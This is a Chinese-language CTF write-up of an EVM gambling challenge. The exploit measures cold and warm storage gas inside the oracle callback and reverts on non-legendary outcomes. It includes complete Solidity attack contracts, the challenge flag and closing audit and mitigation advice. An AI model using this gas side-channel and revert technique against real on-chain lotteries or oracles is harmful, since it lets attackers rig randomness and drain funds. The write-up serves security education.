# Lets Go Gambling!

## 题目简述

题目部署了一条 EVM 私链和 `LetsGoGambling` 合约。玩家花费 1 ether 购买一个箱子，调用 `open()` 后由链外 oracle 随机返回 $0$ 至 $99$；小于 5 时为 legendary。初始四种稀有度各有 10 件库存，目标是令 `legendary == 10`。

直接依靠概率需要购买和消耗大量箱子，但 `fulfill()` 在扣除箱子前会回调玩家合约。该回调发生在随机稀有度对应的 `stock[rarity]` 已经被读取、因而其存储槽处于 warm 状态之后。攻击合约可以通过 `SLOAD` 的冷、热 gas 差异识别本轮是否为 legendary，并让所有非 legendary 的履约交易回滚。决定性机制是 EVM 交易级访问列表和合约回滚语义，因此本题归类为 Blockchain，而不是按源码目录机械归入 Web。

## 解题过程

目标合约的关键代码如下：

```solidity
function fulfill(uint256 id, bytes32 random) external {
    address player = requests[id];
    uint256 x = uint256(random);
    require(msg.sender == ORACLE && player != address(0) && x < 100);
    uint256 rarity = x < 5 ? 3 : x < 20 ? 2 : x < 50 ? 1 : 0;
    uint256 n = stock[rarity];
    require(n != 0);
    live = true;
    Player(player).gamble();
    live = false;
    stock[rarity] = n - 1;
    boxes[player]--;
    if (rarity == 3) legendary++;
    delete requests[id];
}
```

读取 `stock[rarity]` 后，对应 storage key 在本次交易剩余时间内保持 warm。随后进入攻击者的 `gamble()`，依次调用四个公开 getter 并测量 gas：

```solidity
function gamble() external view {
    uint256 g = gasleft();
    TARGET.stock(0);
    uint256 a = g - gasleft();

    g = gasleft();
    TARGET.stock(1);
    uint256 b = g - gasleft();

    g = gasleft();
    TARGET.stock(2);
    uint256 c = g - gasleft();

    g = gasleft();
    TARGET.stock(3);
    uint256 d = g - gasleft();

    if (d > a || d > b || d > c) revert();
}
```

同一笔交易中，首次读取一个冷 storage key 的成本显著高于再次读取 warm key。若 oracle 选中 `rarity == 3`，`stock[3]` 已在回调前被读取，所以 $d$ 最小，回调正常返回；若选中 0、1、2 中任意一种，对应的 $a$、$b$ 或 $c$ 会更小，条件成立并执行 `revert()`。

回滚不只取消回调本身，而会向上传播并撤销整次 `fulfill()`，包括库存扣减、箱子扣减、请求删除和 `live` 修改。因此产生如下筛选效果：

```text
普通/稀有/史诗：回调识别 -> revert -> 不消耗箱子，状态恢复
legendary：       回调放行 -> stock[3]--，boxes[player]--，legendary++
```

部署攻击合约时一次投入 10 ether，恰好购买 10 个箱子：

```solidity
contract Solve {
    Target immutable TARGET;

    constructor(address setup) payable {
        TARGET = Target(Setup(setup).TARGET());
        TARGET.buy{value: 10 ether}(10);
    }

    function step() external {
        TARGET.open();
    }

    // gamble() 使用上面的 cold/warm gas 判定
}
```

之后重复发送 `step()` 交易。每次 `open()` 只登记请求并发出 `Requested(id)` 事件，链外 oracle 监听事件后另发一笔 `fulfill()` 交易，所以要持续产生足够多的独立随机请求。单次 legendary 概率为 $5\%$，官方脚本默认广播 400 次尝试；非 legendary 结果不会消耗箱子，累计放行 10 次 legendary 后即满足：

```solidity
function isSolved() external view returns (bool) {
    return TARGET.legendary() == 10;
}
```

向题目启动器提交已完成实例即可取得：

```text
grey{omg_its_a_karambit_case_hardened_blue_gem}
```

## 方法总结

本题利用的不是随机数可预测，而是随机结果在回调前通过 EVM 微观状态泄漏。`stock[rarity]` 的一次读取把所选槽位留在交易级 warm 集合中，攻击合约测量四个 getter 的相对 gas，得到一个足以区分 legendary 与其他结果的侧信道。

更关键的是回调失败的原子性：非目标结果整体回滚，目标结果才消耗资源，10 个箱子便可以被反复用于概率筛选。审计带回调的抽奖或 oracle 合约时，应同时检查回调前的状态访问是否泄漏结果，以及外部调用失败能否让参与者无成本拒绝不利结果。可行的防护包括在回调前后避免可区分的状态预热，并采用不会因玩家回调失败而撤销结算的 pull 模式。
